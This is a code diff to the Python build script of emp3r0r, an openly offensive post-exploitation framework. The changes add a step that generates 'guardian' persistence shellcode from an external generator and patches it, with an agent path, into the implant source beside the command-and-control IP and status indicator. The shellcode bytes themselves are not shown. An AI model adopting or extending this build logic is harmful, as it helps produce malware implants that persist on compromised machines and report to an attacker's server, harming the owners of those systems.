@@ -13,6 +13,7 @@ import os
 import random
 import readline
 import shutil
+import subprocess
 import sys
 import traceback
 import uuid
@@ -122,16 +123,15 @@ class GoBuild:
     def unset_tags(self):
         '''
         restore tags in the source
-
-        - CA: emp3r0r CA, ./internal/tun/tls.go
-        - CC indicator: check if CC is online, ./internal/agent/def.go
-        - Agent ID: UUID (tag) of our agent, ./internal/agent/def.go
-        - CC IP: IP of CC server, ./internal/agent/def.go
         '''
 
         sed("./internal/agent/def.go",
             self.AgentRoot, "[agent_root]")
         sed("./internal/tun/tls.go", self.CA, "[emp3r0r_ca]")
+        sed("./internal/agent/def.go", CACHED_CONF['guadian_shellcode'],
+            "[persistence_shellcode]")
+        sed("./internal/agent/def.go", CACHED_CONF['guardian_agent_path'],
+            "[persistence_agent_path]")
         sed("./internal/agent/def.go", self.INDICATOR, "[cc_indicator]")
         # in case we use the same IP for indicator and CC
         sed("./internal/agent/def.go", self.CCIP, "[cc_ipaddr]")
@@ -147,13 +147,12 @@ class GoBuild:
     def set_tags(self):
         '''
         modify some tags in the source
-
-        - CA: emp3r0r CA, ./internal/tun/tls.go
-        - CC indicator: check if CC is online, ./internal/agent/def.go
-        - Agent ID: UUID (tag) of our agent, ./internal/agent/def.go
-        - CC IP: IP of CC server, ./internal/agent/def.go
         '''
 
+        sed("./internal/agent/def.go",
+            "[persistence_shellcode]", CACHED_CONF['guadian_shellcode'])
+        sed("./internal/agent/def.go",
+            "[persistence_agent_path]", CACHED_CONF['guardian_agent_path'])
         sed("./internal/tun/tls.go", "[emp3r0r_ca]", self.CA)
         sed("./internal/agent/def.go", "[cc_ipaddr]", self.CCIP)
         sed("./internal/agent/def.go",
@@ -226,6 +225,7 @@ def rand_str(length):
     uuidstr = str(uuid.uuid4()).replace('-', '')
 
     # we don't want the string to be long
+
     if length >= len(uuidstr):
         return uuidstr
 
@@ -284,6 +284,21 @@ def main(target):
     if not use_cached:
         indicator = input("CC status indicator: ").strip()
         CACHED_CONF['cc_indicator'] = indicator
+
+    # guardian shellcode
+
+    use_cached = False
+
+    if "guadian_shellcode" in CACHED_CONF and "guardian_agent_path" in CACHED_CONF:
+        guadian_shellcode = CACHED_CONF['guadian_shellcode']
+        guardian_agent_path = CACHED_CONF['guardian_agent_path']
+        use_cached = yes_no(
+            f"Use cached {len(guadian_shellcode)} bytes of guardian shellcode ({guardian_agent_path})?")
+
+    if not use_cached:
+        path = input("Agent path for guadian shellcode: ").strip()
+        CACHED_CONF['guadian_shellcode'] = gen_guardian_shellcode(path)
+        CACHED_CONF['guardian_agent_path'] = path
 
     gobuild = GoBuild(target="agent", cc_indicator=indicator, cc_ip=ccip)
     gobuild.build()
@@ -347,6 +362,29 @@ def randomize_ports():
 
     if 'broadcast_port' not in CACHED_CONF:
         CACHED_CONF['broadcast_port'] = rand_port()
+
+
+def gen_guardian_shellcode(path):
+    '''
+    ../shellcode/gen.py
+    '''
+    try:
+        pwd = os.getcwd()
+        os.chdir("../shellcode")
+        out = subprocess.check_output(["python3", "gen.py", path])
+        os.chdir(pwd)
+
+        shellcode = out.decode('utf-8')
+        if "Failed" in shellcode:
+            log_error("Failed to generate shellcode: "+out)
+
+            return "N/A"
+    except BaseException:
+        log_error(traceback.format_exc())
+
+        return "N/A"
+
+    return shellcode
 
 
 # command line args
